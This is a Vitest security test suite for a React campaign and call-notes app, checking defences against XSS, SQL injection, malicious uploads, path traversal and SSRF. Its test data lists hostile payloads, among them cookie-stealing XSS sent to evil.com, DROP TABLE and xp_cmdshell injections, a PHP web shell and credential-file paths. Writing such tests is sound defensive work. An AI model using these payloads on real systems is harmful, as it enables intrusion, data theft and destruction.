import React from 'react'
import { describe, it, expect, beforeEach, vi } from 'vitest'
import { render, screen, fireEvent, waitFor } from '@testing-library/react'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { BrowserRouter } from 'react-router-dom'
import { CampaignForm } from '../../src/components/campaigns/CampaignForm'
import { UserProfileForm } from '../../src/components/user/UserProfileForm'
import { CallNotesForm } from '../../src/components/calls/CallNotesForm'
import { sanitizeInput, validateEmail, validatePhoneNumber } from '../../src/utils/validation'
import { campaignService } from '../../src/services/campaigns'

// Mock services
vi.mock('../../src/services/campaigns')
const mockCampaignService = vi.mocked(campaignService)

const TestWrapper: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const queryClient = new QueryClient({
    defaultOptions: {
      queries: { retry: false },
      mutations: { retry: false }
    }
  })

  return (
    <QueryClientProvider client={queryClient}>
      <BrowserRouter>
        {children}
      </BrowserRouter>
    </QueryClientProvider>
  )
}

describe('Input Validation Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  describe('XSS Prevention', () => {
    it('should sanitize HTML script tags in campaign form', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '"><script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        '<svg onload=alert("xss")>',
        '<iframe src="javascript:alert(\'xss\')"></iframe>',
        '<body onload=alert("xss")>',
        '<input onfocus=alert("xss") autofocus>',
        'javascript:alert("xss")',
        '<style>@import"javascript:alert(\'xss\')"</style>',
        '<link rel=stylesheet href="javascript:alert(\'xss\')">'
      ]

      mockCampaignService.create.mockImplementation((data) => {
        // Verify that malicious scripts are sanitized
        expect(data.name).not.toContain('<script>')
        expect(data.description).not.toContain('<script>')
        expect(data.name).not.toContain('javascript:')
        expect(data.description).not.toContain('onerror=')
        return Promise.resolve({ id: '123', ...data })
      })

      render(
        <TestWrapper>
          <CampaignForm />
        </TestWrapper>
      )

      const nameInput = screen.getByLabelText(/campaign name/i)
      const descriptionInput = screen.getByLabelText(/description/i)
      const submitButton = screen.getByRole('button', { name: /create campaign/i })

      for (const payload of xssPayloads) {
        fireEvent.change(nameInput, { target: { value: payload } })
        fireEvent.change(descriptionInput, { target: { value: payload } })
        fireEvent.click(submitButton)

        await waitFor(() => {
          // Input should be sanitized
          const sanitizedValue = sanitizeInput(payload)
          expect(nameInput).toHaveValue(sanitizedValue)
          expect(descriptionInput).toHaveValue(sanitizedValue)
        })
      }
    })

    it('should prevent XSS in user profile form', async () => {
      const xssPayloads = [
        '<script>document.cookie="stolen"</script>',
        '"><script>fetch("http://evil.com?cookie="+document.cookie)</script>',
        '<img src=x onerror="window.location=\'http://evil.com?cookie=\'+document.cookie">',
        '<svg onload="eval(atob(\'YWxlcnQoJ3hzcycp\'))">',
        '<iframe src="data:text/html,<script>alert(\'xss\')</script>"></iframe>'
      ]

      render(
        <TestWrapper>
          <UserProfileForm />
        </TestWrapper>
      )

      const nameInput = screen.getByLabelText(/full name/i)
      const companyInput = screen.getByLabelText(/company/i)
      const bioInput = screen.getByLabelText(/bio/i)

      for (const payload of xssPayloads) {
        fireEvent.change(nameInput, { target: { value: payload } })
        fireEvent.change(companyInput, { target: { value: payload } })
        fireEvent.change(bioInput, { target: { value: payload } })

        // Verify inputs are sanitized
        expect(nameInput.value).not.toContain('<script>')
        expect(nameInput.value).not.toContain('onerror=')
        expect(nameInput.value).not.toContain('javascript:')
        expect(companyInput.value).not.toContain('<iframe>')
        expect(bioInput.value).not.toContain('<svg onload=')
      }
    })

    it('should sanitize call notes to prevent stored XSS', async () => {
      const maliciousNotes = [
        'Great call! <script>alert("stored xss")</script>',
        'Customer interested <img src=x onerror=alert("xss")>',
        'Follow up needed <svg onload=alert("xss")></svg>',
        'Call back tomorrow <iframe src="javascript:alert(\'xss\')"></iframe>'
      ]

      render(
        <TestWrapper>
          <CallNotesForm callId="call-123" />
        </TestWrapper>
      )

      const notesInput = screen.getByLabelText(/notes/i)
      const saveButton = screen.getByRole('button', { name: /save notes/i })

      for (const maliciousNote of maliciousNotes) {
        fireEvent.change(notesInput, { target: { value: maliciousNote } })
        fireEvent.click(saveButton)

        await waitFor(() => {
          const sanitizedValue = sanitizeInput(maliciousNote)
          expect(sanitizedValue).not.toContain('<script>')
          expect(sanitizedValue).not.toContain('onerror=')
          expect(sanitizedValue).not.toContain('javascript:')
        })
      }
    })
  })

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in search queries', async () => {
      const sqlPayloads = [
        "'; DROP TABLE campaigns; --",
        "1' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO campaigns (name) VALUES ('malicious'); --",
        "admin'--",
        "admin' /*",
        "' OR 1=1#",
        "' OR 'a'='a",
        "'; EXEC xp_cmdshell('dir'); --",
        "1'; UPDATE campaigns SET name='hacked' WHERE id=1; --"
      ]

      mockCampaignService.search.mockImplementation((query) => {
        // Verify query is properly parameterized/escaped
        expect(query).not.toContain('DROP TABLE')
        expect(query).not.toContain('UNION SELECT')
        expect(query).not.toContain('INSERT INTO')
        expect(query).not.toContain('UPDATE')
        expect(query).not.toContain('DELETE FROM')
        expect(query).not.toContain('EXEC')
        expect(query).not.toContain('xp_cmdshell')
        return Promise.resolve([])
      })

      const SearchComponent = () => {
        const [query, setQuery] = React.useState('')

        const handleSearch = () => {
          campaignService.search(query)
        }

        return (
          <div>
            <input 
              data-testid="search-input"
              value={query}
              onChange={(e) => setQuery(e.target.value)}
            />
            <button onClick={handleSearch}>Search</button>
          </div>
        )
      }

      render(
        <TestWrapper>
          <SearchComponent />
        </TestWrapper>
      )

      const searchInput = screen.getByTestId('search-input')
      const searchButton = screen.getByRole('button', { name: /search/i })

      for (const payload of sqlPayloads) {
        fireEvent.change(searchInput, { target: { value: payload } })
        fireEvent.click(searchButton)

        await waitFor(() => {
          expect(mockCampaignService.search).toHaveBeenCalledWith(payload)
        })
      }
    })
  })

  describe('Input Sanitization', () => {
    it('should properly sanitize HTML content', () => {
      const testCases = [
        {
          input: '<script>alert("xss")</script>Hello World',
          expected: 'Hello World'
        },
        {
          input: '<img src=x onerror=alert("xss")>Image',
          expected: 'Image'
        },
        {
          input: 'Normal text with <b>bold</b> formatting',
          expected: 'Normal text with bold formatting'
        },
        {
          input: '<div onclick="malicious()">Click me</div>',
          expected: 'Click me'
        },
        {
          input: '<a href="javascript:alert(\'xss\')">Link</a>',
          expected: 'Link'
        }
      ]

      for (const testCase of testCases) {
        const sanitized = sanitizeInput(testCase.input)
        expect(sanitized).toBe(testCase.expected)
      }
    })

    it('should validate email addresses properly', () => {
      const validEmails = [
        'user@example.com',
        'test.email@domain.co.uk',
        'user+tag@example.org',
        'firstname.lastname@company.com'
      ]

      const invalidEmails = [
        'invalid-email',
        '@domain.com',
        'user@',
        'user@domain',
        'user..double.dot@domain.com',
        'user@domain..com',
        '<script>alert("xss")</script>@domain.com',
        'user@domain.com<script>alert("xss")</script>',
        'user@domain.com"; DROP TABLE users; --'
      ]

      for (const email of validEmails) {
        expect(validateEmail(email)).toBe(true)
      }

      for (const email of invalidEmails) {
        expect(validateEmail(email)).toBe(false)
      }
    })

    it('should validate phone numbers securely', () => {
      const validPhones = [
        '+1234567890',
        '+1 (234) 567-8900',
        '(234) 567-8900',
        '234-567-8900',
        '2345678900'
      ]

      const invalidPhones = [
        'not-a-phone',
        '123',
        '+1234567890123456789', // Too long
        '<script>alert("xss")</script>',
        '1234567890"; DROP TABLE users; --',
        'javascript:alert("xss")'
      ]

      for (const phone of validPhones) {
        expect(validatePhoneNumber(phone)).toBe(true)
      }

      for (const phone of invalidPhones) {
        expect(validatePhoneNumber(phone)).toBe(false)
      }
    })
  })

  describe('File Upload Security', () => {
    it('should validate file types and reject malicious files', async () => {
      const maliciousFiles = [
        { name: 'malware.exe', type: 'application/x-msdownload', content: 'MZ\x90\x00' },
        { name: 'script.php', type: 'application/x-php', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'script.js', type: 'application/javascript', content: 'alert("xss")' },
        { name: 'virus.bat', type: 'application/x-bat', content: '@echo off\ndel /q *.*' },
        { name: 'malicious.html', type: 'text/html', content: '<script>alert("xss")</script>' }
      ]

      const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf', 'text/plain']
      const maxFileSize = 5 * 1024 * 1024 // 5MB

      const FileUploadComponent = () => {
        const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
          const file = event.target.files?.[0]
          if (!file) return

          // Validate file type
          if (!allowedTypes.includes(file.type)) {
            throw new Error('File type not allowed')
          }

          // Validate file size
          if (file.size > maxFileSize) {
            throw new Error('File too large')
          }

          // Additional security checks
          if (file.name.includes('../') || file.name.includes('..\\')) {
            throw new Error('Invalid file name')
          }
        }

        return (
          <input 
            type="file"
            data-testid="file-input"
            onChange={handleFileUpload}
          />
        )
      }

      render(
        <TestWrapper>
          <FileUploadComponent />
        </TestWrapper>
      )

      const fileInput = screen.getByTestId('file-input')

      for (const maliciousFile of maliciousFiles) {
        const file = new File([maliciousFile.content], maliciousFile.name, {
          type: maliciousFile.type
        })

        expect(() => {
          fireEvent.change(fileInput, { target: { files: [file] } })
        }).toThrow(/file type not allowed|invalid file name/i)
      }
    })

    it('should prevent path traversal in file names', () => {
      const maliciousFileNames = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '../.env',
        '../../package.json',
        'test/../../../sensitive.txt',
        'normal.txt\\..\\..\\sensitive.txt'
      ]

      const validateFileName = (fileName: string): boolean => {
        // Prevent path traversal
        if (fileName.includes('../') || fileName.includes('..\\')) {
          return false
        }

        // Prevent absolute paths
        if (fileName.startsWith('/') || fileName.includes(':\\')) {
          return false
        }

        // Check for null bytes
        if (fileName.includes('\0')) {
          return false
        }

        return true
      }

      for (const fileName of maliciousFileNames) {
        expect(validateFileName(fileName)).toBe(false)
      }

      // Valid file names should pass
      const validFileNames = ['document.pdf', 'image.jpg', 'data.csv']
      for (const fileName of validFileNames) {
        expect(validateFileName(fileName)).toBe(true)
      }
    })
  })

  describe('URL Validation', () => {
    it('should validate URLs to prevent SSRF attacks', () => {
      const maliciousUrls = [
        'http://localhost:22',
        'http://127.0.0.1:3000',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'ftp://internal-server/sensitive-data',
        'gopher://127.0.0.1:25',
        'http://0.0.0.0:80',
        'http://[::1]:8080',
        'http://internal.company.com/admin'
      ]

      const allowedUrls = [
        'https://api.example.com/webhook',
        'https://secure-domain.com/callback',
        'https://trusted-partner.org/endpoint'
      ]

      const validateUrl = (url: string): boolean => {
        try {
          const parsed = new URL(url)
          
          // Only allow HTTPS for external webhooks
          if (parsed.protocol !== 'https:') {
            return false
          }

          // Block local/private IP ranges
          const hostname = parsed.hostname
          if (
            hostname === 'localhost' ||
            hostname.startsWith('127.') ||
            hostname.startsWith('10.') ||
            hostname.startsWith('172.16.') ||
            hostname.startsWith('192.168.') ||
            hostname === '0.0.0.0' ||
            hostname === '::1'
          ) {
            return false
          }

          // Allow only specific trusted domains
          const allowedDomains = ['api.example.com', 'secure-domain.com', 'trusted-partner.org']
          return allowedDomains.includes(hostname)
        } catch {
          return false
        }
      }

      for (const url of maliciousUrls) {
        expect(validateUrl(url)).toBe(false)
      }

      for (const url of allowedUrls) {
        expect(validateUrl(url)).toBe(true)
      }
    })
  })

  describe('Input Length Validation', () => {
    it('should enforce maximum input lengths to prevent DoS', () => {
      const inputs = [
        { field: 'campaign_name', maxLength: 100 },
        { field: 'description', maxLength: 1000 },
        { field: 'notes', maxLength: 2000 },
        { field: 'company_name', maxLength: 200 }
      ]

      for (const input of inputs) {
        const normalLength = 'a'.repeat(input.maxLength)
        const exceedsLength = 'a'.repeat(input.maxLength + 1)
        const extremeLength = 'a'.repeat(input.maxLength * 10)

        expect(normalLength.length).toBeLessThanOrEqual(input.maxLength)
        expect(validateInputLength(normalLength, input.maxLength)).toBe(true)
        expect(validateInputLength(exceedsLength, input.maxLength)).toBe(false)
        expect(validateInputLength(extremeLength, input.maxLength)).toBe(false)
      }
    })
  })

  describe('Special Character Handling', () => {
    it('should properly handle unicode and special characters', () => {
      const testInputs = [
        { input: 'Normal text', expected: true },
        { input: 'Text with émojis 🚀', expected: true },
        { input: 'Unicode: café, naïve, résumé', expected: true },
        { input: 'Math symbols: ∑, ∆, π', expected: true },
        { input: 'Currency: $, €, ¥, £', expected: true },
        { input: 'Null byte: hello\0world', expected: false },
        { input: 'Control chars: \x01\x02\x03', expected: false },
        { input: 'RTL override: \u202E\u202D', expected: false }
      ]

      const validateUnicodeInput = (input: string): boolean => {
        // Check for null bytes
        if (input.includes('\0')) return false
        
        // Check for control characters (except common whitespace)
        for (let i = 0; i < input.length; i++) {
          const charCode = input.charCodeAt(i)
          if (charCode < 32 && charCode !== 9 && charCode !== 10 && charCode !== 13) {
            return false
          }
        }

        // Check for dangerous Unicode characters
        const dangerousChars = ['\u202E', '\u202D', '\u2066', '\u2067', '\u2068', '\u2069']
        for (const char of dangerousChars) {
          if (input.includes(char)) return false
        }

        return true
      }

      for (const testCase of testInputs) {
        expect(validateUnicodeInput(testCase.input)).toBe(testCase.expected)
      }
    })
  })
})

// Helper functions for validation
function validateInputLength(input: string, maxLength: number): boolean {
  return input.length <= maxLength
}